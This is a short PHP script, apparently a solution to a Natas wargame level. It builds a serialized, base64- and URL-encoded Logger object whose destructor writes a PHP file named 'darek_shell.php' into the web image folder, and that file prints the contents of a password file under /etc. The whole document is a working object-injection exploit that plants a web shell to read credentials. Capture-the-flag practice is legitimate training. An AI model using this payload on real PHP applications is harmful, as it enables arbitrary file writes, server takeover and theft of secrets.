<?
    class Logger{
        private $logFile = "img/darek_shell.php";
        private $initMsg = "does not metter";
        private $exitMsg = "<?php echo file_get_contents('/etc/natas_webpass/natas27'); ?>";
      
        function __construct($file) {}

        function log($msg){}
      
        function __destruct(){
            // write exit message
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$this->exitMsg);
            fclose($fd);
        }
    }

    $createdLogger = new Logger("some");
    echo urlencode(base64_encode(serialize($createdLogger)));
?>